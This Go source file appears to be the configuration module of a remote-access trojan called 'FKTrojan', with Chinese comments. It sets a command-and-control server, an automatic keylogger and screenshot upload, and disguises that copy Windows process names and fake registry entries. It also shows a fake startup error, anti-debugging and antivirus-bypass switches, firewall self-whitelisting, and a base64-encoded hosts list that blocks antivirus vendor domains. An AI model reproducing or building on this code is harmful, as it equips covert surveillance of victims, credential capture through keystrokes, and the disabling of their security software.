/*
Author: FreeKnight
基本变量数据
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"encoding/json"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"
	"strconv"
)
//------------------------------------------------------------
type Config struct {
	DebugMode string `json:"debug_mode"`
	ServerAddress string `json:"server_address"`
	UseSSL string `json:"use_ssl"`
	InstallMe string `json:"install_me"`
	StartupError string `json:"startup_error"`
	EditHost string `json:"edit_host"`
	ScreenShot string `json:"screen_shot"`
	KeyLogger string `json:"key_logger"`
}
//------------------------------------------------------------
// 在有config.json的情况下使用配置，否则使用默认值
func loadConfig(configPath string) {

	if !checkIsFileExist(configPath) {
		//fmt.Printf("do not use %s \n", configPath)
		return
	}
	recordByte, err := ioutil.ReadFile(configPath)
	if err != nil {
		return
	}
	var config Config
	err = json.Unmarshal(recordByte, &config)
	if err != nil {
		return
	}

	var b bool
	b, err = strconv.ParseBool(config.DebugMode)
	if err == nil{isFKDebug = b}
	if config.ServerAddress != "" {
		serverAddress = config.ServerAddress
	}
	b, err = strconv.ParseBool(config.UseSSL)
	if err == nil{useSSL = b}
	b, err = strconv.ParseBool(config.InstallMe)
	if err == nil{installMe = b}
	b, err = strconv.ParseBool(config.StartupError)
	if err == nil{startUpError = b}
	b, err = strconv.ParseBool(config.EditHost)
	if err == nil{editHosts = b}
	b, err = strconv.ParseBool(config.ScreenShot)
	if err == nil{autoScreenShot = b}
	b, err = strconv.ParseBool(config.KeyLogger)
	if err == nil{autoKeylogger = b}
}
func init() {
	currentPath := common.CurrentBinaryDir()
	configPath := filepath.Join(currentPath, "config_client.json")
	loadConfig(configPath)

	FKDebugLog("Config: " + configPath)
	FKDebugLog("Is debug mode: " + strconv.FormatBool(isFKDebug))
	FKDebugLog("ServerAddress: " + serverAddress)
	FKDebugLog("Use ssl: " + strconv.FormatBool(useSSL))
	FKDebugLog("Install me: " + strconv.FormatBool(installMe))
	FKDebugLog("Edit hosts: " + strconv.FormatBool(editHosts))
	FKDebugLog("Screen shot: " + strconv.FormatBool(autoScreenShot))
	FKDebugLog("Key logger: " + strconv.FormatBool(autoKeylogger))
}

//------------------------------------------------------------
var (
	clientVersion string = "Nurhaci"                      // 客户端版本，暂以清朝皇帝英文名排序
	watchdogName  string = "ServiceHelper"                // 看门狗程序名称
	curTime       string = time.Now().Format(time.RFC850) // 当前时间

	serverAddress         string = "https://192.168.0.10:7777/"           // HTTPS C&C服务器地址
	useSSL                bool   = true                                   // 是否使用SSL连接服务器。如果是，则C&C服务器必须是https的。
	sslInsecureSkipVerify bool   = true                                   // 是否使用不安全的SSL证书。如果是，则使用AKA自签名【不推荐】。
	userAgentKey          string = "0AB9008394AA329280DB3FCD6A328EDC"     // 服务器用来鉴别这个应用是不是客户端的标示。当前是 MD5("FreeKnight")。
	checkEveryMin         int    = 10                                     // 接受服務器命令的最小秒数。
	checkEveryMax         int    = 60                                     // 接受服務器命令的最大秒数。
	instanceKey           string = "1c152c1e-771f-4bae-a1cf-427af095cb7b" // 本客户端唯一ID，可通过这里生成 https://www.guidgen.com/
	watchdogKey	      string = "211e696d-fbff-428f-9c2d-781cc304056d" // 看门狗唯一ID
	installMe             bool   = true                                   // 是否將本客户端安装到系统中
	installNames                 = [...]string{                           // 本客户端随机进程伪名列表
		"svchost", "csrss", "rundll32", "winlogon", "smss", "taskhost",
		"unsecapp", "AdobeARM", "winsys", "jusched", "BCU", "wscntfy",
		"conhost", "csrss", "dwm", "sidebar", "ADService", "AppServices",
		"acrotray", "ctfmon", "lsass", "realsched", "spoolsv",
		"RTHDCPL", "RTDCPL", "MSASCui",
	}
	registryNames = [...]string{ // 本客户端随机注册表字段名
		"Trion Softworks", "Mystic Entertainment",
		"Microsoft Partners", "Client-Server Runtime Subsystem",
		"Networking Service",
	}
	startUpError      bool   = true                // 是否在軟件啟動時顯示一個警告框
	startUpErrorTitle string = "Application Error" // 警告框的標題
	startUpErrorText  string =                     // 警告框信息
	"The application was unable to start correctly (0xc000007b)," +
		" Click OK to close the application."
	editHosts bool = true // 是否編輯用户Host文件

	activeDefense          bool   = true             // 是否在客戶端啟動時自動开启主动防御机制
	autofirwall            bool   = true             // 如果客户端以Admin权限进行安装，则会自动添加客户端到Windows防火墙中
	antiDebug              bool   = true             // 是否在客戶端啟動時自動開啟反调试程序檢查
	debugReaction          int    = 3                // 如何应对调试程序 0 = 自我毁灭, 1 = 退出, 2 = 无谓的循环, 3 = 输出个日志而已
	autoScreenShot         bool   = true             // 自动发送屏幕截屏给C&C服务器
	autoScreenShotInterval int    = 11               // 自动截屏间隔时间（分）
	sleepOnRun             bool   = true             // 是否在客戶端啟動時之前進行休眠
	sleepOnRunTime         int    = 5                // 啟動前休眠時間（秒），可用於繞過反病毒檢測
	antiVirusBypass        bool   = true             // 是否在客戶端啟動時主动繞過反病毒檢測
	autoKeylogger          bool   = true             // 是否在客戶端啟動時自動進行鍵盤記錄
	autoKeyloggerInterval  int    = 7                // 等待幾分鐘后將鍵盤記錄發送給C&C服務器（分）
	autoReverseProxy       bool   = true             // 是否在客戶端啟動時，啟動反向代理服務
	reverseProxyPort       string = "8080"           // 代理端口
	reverseProxyBackend    string = "127.0.0.1:6060" // 後台發送代理數據，支持多重數據，例如(127.0.0.1:8080,127.0.0.1:8181,....)

	checkIP = [...]string{ // 獲取IP的網站Url
		"http://checkip.amazonaws.com",
		"http://myip.dnsdynamic.org",
		"http://ip.dnsexit.com"}
	maxMindURL  string = common.Deobfuscate("iuuqt;00xxx/nbynjoe/dpn0hfpjq0w3/20djuz0nf") // 獲取IP詳細信息的網站Url
	uTorrnetURL string = "http://download.ap.bittorrent.com/" +
		"track/stable/endpoint/utorrent/os/windows" // 下載uTorrent的網站Url
	tmpAppDataInstallDir string = os.Getenv("APPDATA") + "\\" // 临时文件目录
	winDirPath           string = os.Getenv("WINDIR") + "\\"  // Windows目录
	rawHTMLPage          string = "404 page not found"        // 默認HTML網頁

	// 其他依赖项
	configFile		string = "config_client.json"
	anvirConfigFile		string = "anvir.ini"
	anvirExeFile		string = "winanvir.exe"

	hostlist string = // Host列表
	`CgkJMTI3LjAuMC4xIGxvY2FsaG9zdAoJCTEyNy4wLjAuMSByY
		WRzLm1jYWZlZS5jb20KCQkxMjcuMC4wLjEgdGhyZWF0ZXhwZXJ
		0LmNvbQoJCTEyNy4wLjAuMSB2aXJ1c3NjYW4uam90dGkub3JnC
		gkJMTI3LjAuMC4xIHNjYW5uZXIubm92aXJ1c3RoYW5rcy5vcmc
		KCQkxMjcuMC4wLjEgdmlyc2Nhbi5vcmcKCQkxMjcuMC4wLjEgc
		3ltYW50ZWMuY29tCgkJMTI3LjAuMC4xIHVwZGF0ZS5zeW1hbnR
		lYy5jb20KCQkxMjcuMC4wLjEgY3VzdG9tZXIuc3ltYW50ZWMuY
		29tCgkJMTI3LjAuMC4xIG1jYWZlZS5jb20KCQkxMjcuMC4wLjE
		gdXMubWNhZmVlLmNvbQoJCTEyNy4wLjAuMSBtYXN0Lm1jYWZlZ
		S5jb20KCQkxMjcuMC4wLjEgZGlzcGF0Y2gubWNhZmVlLmNvbQo
		JCTEyNy4wLjAuMSBkb3dubG9hZC5tY2FmZWUuY29tCgkJMTI3L
		jAuMC4xIHNvcGhvcy5jb20KCQkxMjcuMC4wLjEgc3ltYW50ZWN
		saXZldXBkYXRlLmNvbQoJCTEyNy4wLjAuMSBsaXZldXBkYXRlL
		nN5bWFudGVjbGl2ZXVwZGF0ZS5jb20KCQkxMjcuMC4wLjEgc2V
		jdXJpdHlyZXNwb25zZS5zeW1hbnRlYy5jb20KCQkxMjcuMC4wL
		jEgdmlydXNsaXN0LmNvbQoJCTEyNy4wLjAuMSBmLXNlY3VyZS5
		jb20KCQkxMjcuMC4wLjEga2FzcGVyc2t5LmNvbQoJCTEyNy4wL
		jAuMSBrYXNwZXJza3ktbGFicy5jb20KCQkxMjcuMC4wLjEgYXZ
		wLmNvbQoJCTEyNy4wLjAuMSBuZXR3b3JrYXNzb2NpYXRlcy5jb
		20KCQkxMjcuMC4wLjEgY2EuY29tCgkJMTI3LjAuMC4xIG15LWV
		0cnVzdC5jb20KCQkxMjcuMC4wLjEgbmFpLmNvbQoJCTEyNy4wL
		jAuMSB0c2VjdXJlLm5haS5jb20KCQkxMjcuMC4wLjEgdmlydXN
		0b3RhbC5jb20KCQkxMjcuMC4wLjEgdHJlbmRtaWNyby5jb20KC
		QkxMjcuMC4wLjEgZ3Jpc29mdC5jb20KCQkxMjcuMC4wLjEgZWx
		lbWVudHNjYW5uZXIuY29tCgkJMTI3LjAuMC4xIGFjY291bnQub
		m9ydG9uLmNvbQoJCTEyNy4wLjAuMSBibGVlcGluZ2NvbXB1dGV
		yLmNvbQoJCTEyNy4wLjAuMSBtYWxla2FsLmNvbQoJCTEyNy4wL
		jAuMSBhY2NvdW50cy5jb21vZG8uY29tCgkJMTI3LjAuMC4xIGF
		jdGl2YXRpb24uYWR0cnVzdG1lZGlhLmNvbQoJCTEyNy4wLjAuM
		SBhY3RpdmF0aW9uLXYyLmthc3BlcnNreS5jb20KCQkxMjcuMC4
		wLjEgYXV0aC5mZi5hdmFzdC5jb20KCQkxMjcuMC4wLjEgYXZzd
		GF0cy5hdmlyYS5jb20KCQkxMjcuMC4wLjEgYmFja3VwMS5idWx
		sZ3VhcmQuY29tCgkJMTI3LjAuMC4xIGJ1ZGR5LmJpdGRlZmVuZ
		GVyLmNvbQoJCTEyNy4wLjAuMSBjMi5kZXYuZHJ3ZWIuY29tCgk
		JMTI3LjAuMC4xIGFudGl2aXJ1cy5iYWlkdS5jb20KCQkxMjcuM
		C4wLjEgY2RuLnN0YXRpYy5tYWx3YXJlYnl0ZXMub3JnCgkJMTI
		3LjAuMC4xIGNzYXNtYWluLnN5bWFudGVjLmNvbQoJCTEyNy4wL
		jAuMSBkZWZpbml0aW9uc2JkLmxhdmFzb2Z0LmNvbQoJCTEyNy4
		wLjAuMSBkbS5rYXNwZXJza3ktbGFicy5jb20KCQkxMjcuMC4wL
		jEgZG5zc2Nhbi5zaGFkb3dzZXJ2ZXIub3JnCgkJMTI3LjAuMC4
		xIGRvd25sb2FkLmJpdGRlZmVuZGVyLmNvbQoJCTEyNy4wLjAuM
		SBkb3dubG9hZC5idWxsZ3VhcmQuY29tCgkJMTI3LjAuMC4xIGR
		vd25sb2FkLmNvbW9kby5jb20KCQkxMjcuMC4wLjEgZG93bmxvY
		WQuZXNldC5jb20KCQkxMjcuMC4wLjEgZG93bmxvYWQuZ2VvLmR
		yd2ViLmNvbQoJCTEyNy4wLjAuMSBkb3dubG9hZG5hZGEubGF2Y
		XNvZnQuY29tCgkJMTI3LjAuMC4xIGRvd25sb2Fkcy5jb21vZG8
		uY29tCgkJMTI3LjAuMC4xIGRvd25sb2Fkcy5sYXZhc29mdC5jb
		20KCQkxMjcuMC4wLjEgcmVhc29uY29yZXNlY3VyaXR5LmNvbQo
		JCTEyNy4wLjAuMSBkcndlYi5jb20KCQkxMjcuMC4wLjEgZWMuc
		3VuYmVsdHNvZnR3YXJlLmNvbQoJCTEyNy4wLjAuMSBlbXVwZGF
		0ZS5hdmFzdC5jb20KCQkxMjcuMC4wLjEgZXNldG5vZDMyLnJ1C
		gkJMTI3LjAuMC4xIHppbGx5YS51YQoJCTEyNy4wLjAuMSBleHB
		pcmUuZXNldC5jb20KCQkxMjcuMC4wLjEgZ21zLmFobmxhYi5jb
		20KCQkxMjcuMC4wLjEgZ28uZXNldC5ldQoJCTEyNy4wLjAuMSB
		pMS5jLmVzZXQuY29tCgkJMTI3LjAuMC4xIGkyLmMuZXNldC5jb
		20KCQkxMjcuMC4wLjEgaTMuYy5lc2V0LmNvbQoJCTEyNy4wLjA
		uMSBpNC5jLmVzZXQuY29tCgkJMTI3LjAuMC4xIGlwbG9jLmVzZ
		XQuY29tCgkJMTI3LjAuMC4xIGlwbS5hdmlyYS5jb20KCQkxMjc
		uMC4wLjEgaXBtLmJpdGRlZmVuZGVyLmNvbQoJCTEyNy4wLjAuM
		SBrc240LTEyLmthc3BlcnNreS1sYWJzLmNvbQoJCTEyNy4wLjA
		uMSBrc24tZmlsZS1nZW8ua2FzcGVyc2t5LWxhYnMuY29tCgkJM
		TI3LjAuMC4xIGtzbi1pbmZvLWdlby5rYXNwZXJza3ktbGFicy5
		jb20KCQkxMjcuMC4wLjEga3NuLWlwbS0xLmthc3BlcnNreS1sY
		WJzLmNvbQoJCTEyNy4wLjAuMSBrc24ta2FzLWdlby5rYXNwZXJ
		za3ktbGFicy5jb20KCQkxMjcuMC4wLjEga3NuLWtkZGkua2Fzc
		GVyc2t5LWxhYnMuY29tCgkJMTI3LjAuMC4xIGtzbi1wYnMtZ2V
		vLmthc3BlcnNreS1sYWJzLmNvbQoJCTEyNy4wLjAuMSBrc24tc
		3RhdC1nZW8ua2FzcGVyc2t5LWxhYnMuY29tCgkJMTI3LjAuMC4
		xIGtzbi10Ym9vdC0xLmthc3BlcnNreS1sYWJzLmNvbQoJCTEyN
		y4wLjAuMSBrc24tdGNlcnQtZ2VvLmthc3BlcnNreS1sYWJzLmN
		vbQoJCTEyNy4wLjAuMSBrc24tdHBjZXJ0LTEua2FzcGVyc2t5L
		WxhYnMuY29tCgkJMTI3LjAuMC4xIGtzbi11cmwtZ2VvLmthc3B
		lcnNreS1sYWJzLmNvbQoJCTEyNy4wLjAuMSBrc24tdmVyZGljd
		C1nZW8ua2FzcGVyc2t5LWxhYnMuY29tCgkJMTI3LjAuMC4xIGx
		pY2Vuc2VhY3RpdmF0aW9uLnNlY3VyaXR5LmNvbW9kby5jb20KC
		QkxMjcuMC4wLjEgbGljZW5zZS5hdmlyYS5jb20KCQkxMjcuMC4
		wLjEgbGljZW5zZS5uYW5vYXYucnUKCQkxMjcuMC4wLjEgbGljZ
		W5zZS50cnVzdHBvcnQuY29tCgkJMTI3LjAuMC4xIGxpY2Vuc2l
		uZy5zZWN1cml0eS5jb21vZG8uY29tCgkJMTI3LjAuMC4xIGxvZ
		2luLmJ1bGxndWFyZC5jb20KCQkxMjcuMC4wLjEgbG9naW4ubm9
		ydG9uLmNvbQoJCTEyNy4wLjAuMSBtZXRyaWNzLmJpdGRlZmVuZ
		GVyLmNvbQoJCTEyNy4wLjAuMSBtaXJyb3IwMS5nZGF0YS5kZQo
		JCTEyNy4wLjAuMSBteS5iaXRkZWZlbmRlci5jb20KCQkxMjcuM
		C4wLjEgbmV3dG9uLm5vcm1hbi5jb20KCQkxMjcuMC4wLjEgbml
		tYnVzLmJpdGRlZmVuZGVyLm5ldAoJCTEyNy4wLjAuMSBuaXVmb
		3VyLm5vcm1hbi5ubwoJCTEyNy4wLjAuMSBuaXVvbmUubm9ybWF
		uLm5vCgkJMTI3LjAuMC4xIG5pdXNldmVuLm5vcm1hbi5ubwoJC
		TEyNy4wLjAuMSBvMi5ub3J0b24uY29tCgkJMTI3LjAuMC4xIG9
		tbmkuYXZnLmNvbQoJCTEyNy4wLjAuMSBvbXMuc3ltYW50ZWMuY
		29tCgkJMTI3LjAuMC4xIHAwMDMuc2IuYXZhc3QuY29tCgkJMTI
		3LjAuMC4xIHAuZmlsc2VjbGFiLmNvbQoJCTEyNy4wLjAuMSBwa
		W5nLmF2YXN0LmNvbQoJCTEyNy4wLjAuMSBwcmVtaXVtLmF2aXJ
		hLXVwZGF0ZS5jb20KCQkxMjcuMC4wLjEgcHJvZ3JhbS5hdmFzd
		C5jb20KCQkxMjcuMC4wLjEgcHJveHkuZXNldC5jb20KCQkxMjc
		uMC4wLjEgcmVkaXJlY3QuYXZpcmEuY29tCgkJMTI3LjAuMC4xI
		HJlZzAzLmVzZXQuY29tCgkJMTI3LjAuMC4xIHJlZ2lzdGVyLms
		3Y29tcHV0aW5nLmNvbQoJCTEyNy4wLjAuMSByZXNvbHZlcjEuY
		nVsbGd1YXJkLmN0bWFpbC5jb20KCQkxMjcuMC4wLjEgcmVzb2x
		2ZXIyLmJ1bGxndWFyZC5jdG1haWwuY29tCgkJMTI3LjAuMC4xI
		HJlc29sdmVyMy5idWxsZ3VhcmQuY3RtYWlsLmNvbQoJCTEyNy4
		wLjAuMSByZXNvbHZlcjQuYnVsbGd1YXJkLmN0bWFpbC5jb20KC
		QkxMjcuMC4wLjEgcmVzb2x2ZXI1LmJ1bGxndWFyZC5jdG1haWw
		uY29tCgkJMTI3LjAuMC4xIHJvbC5wYW5kYXNlY3VyaXR5LmNvb
		QoJCTEyNy4wLjAuMSAzNjB0b3RhbHNlY3VyaXR5LmNvbQoJCTE
		yNy4wLjAuMSBzZWN1cmUuY29tb2RvLm5ldAoJCTEyNy4wLjAuM
		SBzaGFzdGEtcnJzLnN5bWFudGVjLmNvbQoJCTEyNy4wLjAuMSB
		zaG9wLmVzZXRub2QzMi5ydQoJCTEyNy4wLjAuMSBzbGN3LmZmL
		mF2YXN0LmNvbQoJCTEyNy4wLjAuMSBzcG9jLXBvb2wtZ3RtLm5
		vcnRvbi5jb20KCQkxMjcuMC4wLjEgcy5wcm9ncmFtLmF2YXN0L
		mNvbQoJCTEyNy4wLjAuMSBzdGF0aWMyLmF2YXN0LmNvbQoJCTE
		yNy4wLjAuMSBzdGF0aWMuYXZnLmNvbQoJCTEyNy4wLjAuMSBzd
		GF0cy5ub3J0b24uY29tCgkJMTI3LjAuMC4xIHN0YXRzLnFhbGF
		icy5zeW1hbnRlYy5jb20KCQkxMjcuMC4wLjEgc3RvcmUubGF2Y
		XNvZnQuY29tCgkJMTI3LjAuMC4xIHN1LmZmLmF2YXN0LmNvbQo
		JCTEyNy4wLjAuMSBzdXBwb3J0Lm5vcnRvbi5jb20KCQkxMjcuM
		C4wLjEgc3ltYW50ZWMudHQub210cmRjLm5ldAoJCTEyNy4wLjA
		uMSB0aHJlYXRuZXQudGhyZWF0dHJhY2suY29tCgkJMTI3LjAuM
		C4xIHRyYWNlLmVzZXQuY29tCgkJMTI3LjAuMC4xIHRyYWNraW5
		nLmxhdmFzb2Z0LmNvbQoJCTEyNy4wLjAuMSB0cy1jcmwud3Muc
		3ltYW50ZWMuY29tCgkJMTI3LjAuMC4xIHRzLmVzZXQuY29tCgk
		JMTI3LjAuMC4xIHVjLmNsb3VkLmF2Zy5jb20KCQkxMjcuMC4wL
		jEgdW0wMS5lc2V0LmNvbQoJCTEyNy4wLjAuMSB1bTIxLmVzZXQ
		uY29tCgkJMTI3LjAuMC4xIHVwZGF0ZTIuYnVsbGd1YXJkLmNvb
		QoJCTEyNy4wLjAuMSB1cGRhdGUuYXZnLmNvbQoJCTEyNy4wLjA
		uMSB1cGRhdGUuYnVsbGd1YXJkLmNvbQoJCTEyNy4wLjAuMSB1c
		GRhdGUuZXNldC5jb20KCQkxMjcuMC4wLjEgdXBkYXRlcy5hZ25
		pdHVtLmNvbQoJCTEyNy4wLjAuMSB1cGRhdGVzLms3Y29tcHV0a
		W5nLmNvbQoJCTEyNy4wLjAuMSB1cGRhdGVzLnN1bmJlbHRzb2Z
		0d2FyZS5jb20KCQkxMjcuMC4wLjEgdXBncmFkZS5iaXRkZWZlb
		mRlci5jb20KCQkxMjcuMC4wLjEgdXBnci1tbXhpaWktcC5jZG4
		uYml0ZGVmZW5kZXIubmV0CgkJMTI3LjAuMC4xIHVwZ3ItbW14a
		XYuY2RuLmJpdGRlZmVuZGVyLm5ldAoJCTEyNy4wLjAuMSB2Ny5
		zdGF0cy5hdmFzdC5jb20KCQkxMjcuMC4wLjEgdmVyc2lvbmNoZ
		WNrLmVzZXQuY29tCgkJMTI3LjAuMC4xIHZsLmZmLmF2YXN0LmN
		vbQoJCTEyNy4wLjAuMSB3YW0ucGFuZGFzZWN1cml0eS5jb20KC
		QkxMjcuMC4wLjEgd2VicHJvdC5hdmdhdGUubmV0CgkJMTI3LjA
		uMC4xIHdlYnByb3QuYXZpcmEuY29tCgkJMTI3LjAuMC4xIHdlY
		nByb3QuYXZpcmEuZGUKCQkxMjcuMC4wLjEgd3NteS5wYW5kYX
		NlY3VyaXR5LmNvbQoJCTEyNy4wLjAuMSBkb3dubG9hZC5zcC5m
		LXNlY3VyZS5jb20KCQkxMjcuMC4wLjEgd3d3LXNlY3VyZS5zeW
		1hbnRlYy5jb20KCQkxMjcuMC4wLjEgc3VuYmVsdHNvZnR3YXJl
		LmNvbQoJCTEyNy4wLjAuMSB0cnVzdHBvcnQuY29tCgkJMTI3Lj
		AuMC4xIGthc3BlcnNreS5ydQoJCTEyNy4wLjAuMSBhdmFzdC5y
		dQoJCTEyNy4wLjAuMSBmcmVlYXZnLmNvbQoJCTEyNy4wLjAuMS
		BmcmVlLmF2Zy5jb20KCQkxMjcuMC4wLjEgZnJlZS5hdmcuY29t
		CgkJMTI3LjAuMC4xIGF2aXJhLmNvbQoJCTEyNy4wLjAuMSB6LW
		9sZWcuY29tCgkJMTI3LjAuMC4xIGJpdGRlZmVuZGVyLmNvbQoJ
		CTEyNy4wLjAuMSBidWxsZ3VhcmQuY29tCgkJMTI3LjAuMC4xIH
		BlcnNvbmFsZmlyZXdhbGwuY29tb2RvLmNvbQoJCTEyNy4wLjAu
		MSBjb21vZG8uY29tCgkJMTI3LjAuMC4xIGRyd2ViLmNvbQoJCT
		EyNy4wLjAuMSBlbXNpc29mdC5ydQoJCTEyNy4wLjAuMSBhdmVz
		Y2FuLnJ1CgkJMTI3LjAuMC4xIGVzY2FuYXYuY29tCgkJMTI3Lj
		AuMC4xIGVzY2FuLmNvbQoJCTEyNy4wLjAuMSBmLXByb3QuY29t
		CgkJMTI3LjAuMC4xIGYtc2VjdXJlLmNvbQoJCTEyNy4wLjAuMS
		BnZGF0YXNvZnR3YXJlLmNvbQoJCTEyNy4wLjAuMSBydS5nZGF0
		YXNvZnR3YXJlLmNvbQoJCTEyNy4wLjAuMSBnZGF0YS5kZQoJCT
		EyNy4wLjAuMSBpa2FydXNzZWN1cml0eS5jb20KCQkxMjcuMC4w
		LjEgbWFsd2FyZWJ5dGVzLm9yZwoJCTEyNy4wLjAuMSBuYW5vYX
		YucnUKCQkxMjcuMC4wLjEgc3ltYW50ZWMuY29tCgkJMTI3LjAu
		MC4xIG5vcnRvbi5jb20KCQkxMjcuMC4wLjEgcnUubm9ydG9uLm
		NvbQoJCTEyNy4wLjAuMSBhZ25pdHVtLnJ1CgkJMTI3LjAuMC4x
		IGNsb3VkYW50aXZpcnVzLmNvbQoJCTEyNy4wLjAuMSBwYW5kYX
		NlY3VyaXR5LmNvbQoJCTEyNy4wLjAuMSByaXNpbmcuY29tLmNu
		CgkJMTI3LjAuMC4xIHJpc2luZy1nbG9iYWwuY29tCgkJMTI3Lj
		AuMC4xIHJpc2luZy1ydXNzaWEuY29tCgkJMTI3LjAuMC4xIGZy
		ZWVyYXYuY29tCgkJMTI3LjAuMC4xIHNhZmVuc29mdC5ydQoJCT
		EyNy4wLjAuMSB0cnVzdHBvcnQuY29tCgkJMTI3LjAuMC4xIHZp
		cnVzdG90YWwuY29tCgkJMTI3LjAuMC4xIHppbGx5YS5jb20KCQ
		kxMjcuMC4wLjEgYW50aS12aXJ1cy5ieQoJCTEyNy4wLjAuMSBz
		b3Bob3MuY29tCgkJMTI3LjAuMC4xIGZyZWVkcndlYi5jb20KCQ
		kxMjcuMC4wLjEgYXZnLmNvbQoJCTEyNy4wLjAuMSBtY2FmZWUu
		Y29tCgkJMTI3LjAuMC4xIHNpdGVhZHZpc29yLmNvbQoJCTEyNy
		4wLjAuMSBzdXBwb3J0Lmthc3BlcnNreS5ydQoJCTEyNy4wLjAu
		MSBjb21zcy5ydQoJCTEyNy4wLjAuMSBzcHl3YXJlLXJ1LmNvbQ
		oJCTEyNy4wLjAuMSB2aXJ1c2luZm8uaW5mbwoJCTEyNy4wLjAu
		MSBmb3J1bS5lc2V0bm9kMzIucnUKCQkxMjcuMC4wLjEgZm9ydW
		0uZHJ3ZWIuY29tCgkJMTI3LjAuMC4xIGZvcnVtLnZpcmxhYi5p
		bmZvCgkJMTI3LjAuMC4xIHNweWJvdC5pbmZvCgkJMTI3LjAuMC
		4xIHdpbnBhdHJvbC5jb20KCQkxMjcuMC4wLjEgcXVpY2to`
)